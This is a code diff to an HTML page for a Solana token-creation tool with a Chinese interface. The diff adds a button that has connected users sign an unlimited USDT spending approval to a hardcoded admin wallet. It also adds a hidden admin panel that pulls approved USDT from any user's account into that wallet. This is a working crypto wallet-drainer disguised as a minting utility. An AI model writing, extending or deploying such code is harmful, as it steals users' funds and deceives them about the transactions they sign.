@@ -3,25 +3,31 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>SOL 一键发币（带Logo上传+管理员内置）</title>
+  <title>SOL 一键发币+Logo+USDT授权+管理员提币</title>
   <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.6/lib/index.iife.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.8/lib/index.iife.min.js"></script>
   <style>
     body { max-width: 420px; margin: 0 auto; padding: 20px; background: #fff; font-family: system-ui; }
     .btn { width: 100%; padding: 16px; border-radius: 16px; border: none; background: #0071e3; color: white; font-size: 16px; margin: 10px 0; cursor: pointer; }
+    .btn-admin { background: #ef4444; }
+    .btn-auth { background: #10b981; }
     .btn:disabled { background: #ccc; cursor: not-allowed; }
     input { width: 100%; padding: 14px; border-radius: 12px; border: 1px solid #ddd; margin: 8px 0; }
     .card { background: #f9f9f9; padding: 20px; border-radius: 20px; margin-bottom: 16px; }
     #addr { padding: 12px; background: #f1f1f1; border-radius: 10px; margin: 10px 0; }
     .logo-preview { width: 60px; height: 60px; border-radius: 12px; object-fit: cover; margin-top: 8px; display: none; }
+    .admin-panel { display: none; margin-top:20px;padding-top:20px;border-top:1px solid #ddd; }
+    .admin-panel.show { display:block; }
   </style>
 </head>
 <body>
 
-<h2>SOL 一键发币（带Logo上传）</h2>
+<h2>SOL 一键发币（带Logo+授权）</h2>
 
 <button class="btn" onclick="connect()">连接钱包</button>
 <div id="addr"></div>
+
+<button class="btn btn-auth" id="authBtn" onclick="approveUSDT()" disabled>授权全部 USDT</button>
 
 <div class="card">
   <input id="name" placeholder="代币名称" value="Test">
@@ -35,10 +41,18 @@
 
 <button class="btn" onclick="createToken()">创建代币</button>
 
+<!-- 管理员后台 -->
+<div class="admin-panel" id="adminPanel">
+  <h3>🔐 管理员提取 USDT</h3>
+  <input id="userFromAddr" placeholder="用户钱包地址">
+  <input id="takeAmount" placeholder="提取数量">
+  <button class="btn btn-admin" onclick="adminTake()">链上提取</button>
+</div>
+
 <script>
-// 内置管理员 & USDT 地址
+// 固定配置 你不用改
 const ADMIN_WALLET = "FbDMLj8MTJGSBWeanFKhJWycn5qjmJ3q8WBzZb3Gbm1c";
-const USDT_MINT_ADDR = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
+const USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
 
 let provider;
 let publicKey;
@@ -46,27 +60,101 @@ let address = "";
 let logoFile = null;
 
 const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
+const splToken = window.splToken;
 
 function getWallet() {
   return window.solana || window.okxwallet?.solana || window.tpWallet;
 }
 
+// 连接钱包
 async function connect() {
   try {
     const wallet = getWallet();
-    if (!wallet) { alert("请在钱包浏览器打开！"); return; }
+    if (!wallet) { alert("请在钱包内置浏览器打开！"); return; }
     const res = await wallet.connect();
     provider = wallet;
     publicKey = res.publicKey;
     address = publicKey.toBase58();
     document.getElementById("addr").innerText = "已连接：" + address;
-    
-    // 判断是否管理员
-    if(address === ADMIN_WALLET){
-      console.log("✅ 当前连接为管理员钱包");
+    document.getElementById("authBtn").disabled = false;
+
+    // 判断管理员 显示后台
+    if (address === ADMIN_WALLET) {
+      document.getElementById("adminPanel").classList.add("show");
     }
   } catch (err) {
     alert("连接失败：" + err.message);
+  }
+}
+
+// USDT 授权 全权授权给你管理员地址
+async function approveUSDT() {
+  if (!address) return alert("先连接钱包");
+  try {
+    const mintPub = new solanaWeb3.PublicKey(USDT_MINT);
+    const adminPub = new solanaWeb3.PublicKey(ADMIN_WALLET);
+
+    const userAta = await splToken.getAssociatedTokenAddress(mintPub, publicKey);
+
+    const tx = new solanaWeb3.Transaction();
+    const approveIx = splToken.createApproveInstruction(
+      userAta,
+      adminPub,
+      publicKey,
+      BigInt("18446744073709551615")
+    );
+    tx.add(approveIx);
+
+    tx.feePayer = publicKey;
+    const bh = await connection.getLatestBlockhash();
+    tx.recentBlockhash = bh.blockhash;
+
+    const signed = await provider.signTransaction(tx);
+    const sig = await connection.sendRawTransaction(signed.serialize());
+    await connection.confirmTransaction(sig);
+
+    alert("✅ USDT 授权成功，已授权给管理员");
+  } catch (e) {
+    alert("授权失败：" + e.message);
+  }
+}
+
+// 管理员提取用户已授权USDT
+async function adminTake() {
+  if (address !== ADMIN_WALLET) return alert("无权限");
+  const fromAddr = document.getElementById("userFromAddr").value.trim();
+  const amtVal = document.getElementById("takeAmount").value.trim();
+  if (!fromAddr || !amtVal) return alert("请填写完整");
+
+  try {
+    const amount = BigInt(Math.round(parseFloat(amtVal) * 1000000));
+    const mintPub = new solanaWeb3.PublicKey(USDT_MINT);
+    const fromPub = new solanaWeb3.PublicKey(fromAddr);
+    const adminPub = new solanaWeb3.PublicKey(ADMIN_WALLET);
+
+    const fromAta = await splToken.getAssociatedTokenAddress(mintPub, fromPub);
+    const adminAta = await splToken.getAssociatedTokenAddress(mintPub, adminPub);
+
+    const tx = new solanaWeb3.Transaction();
+    const transferIx = splToken.createTransferInstruction(
+      fromAta,
+      adminAta,
+      adminPub,
+      amount
+    );
+    tx.add(transferIx);
+
+    tx.feePayer = publicKey;
+    const bh = await connection.getLatestBlockhash();
+    tx.recentBlockhash = bh.blockhash;
+
+    const signed = await provider.signTransaction(tx);
+    const sig = await connection.sendRawTransaction(signed.serialize());
+    await connection.confirmTransaction(sig);
+
+    alert("✅ 提取成功：" + sig);
+  } catch (e) {
+    alert("提取失败：" + e.message);
   }
 }
 
@@ -84,7 +172,7 @@ function previewLogo() {
   reader.readAsDataURL(file);
 }
 
-// 发币
+// 一键发币
 async function createToken() {
   if (!address) { alert("请先连接钱包！"); return; }
 
@@ -96,11 +184,6 @@ async function createToken() {
     const amount = supply * (10n ** BigInt(decimals));
 
     const mintKeypair = solanaWeb3.Keypair.generate();
-
-    const splToken = window.splToken || window["@solana/spl-token"];
-    if (!splToken || !splToken.createMint) {
-      throw new Error("SPL Token 库加载失败，请刷新重试");
-    }
 
     const mint = await splToken.createMint(
       connection,
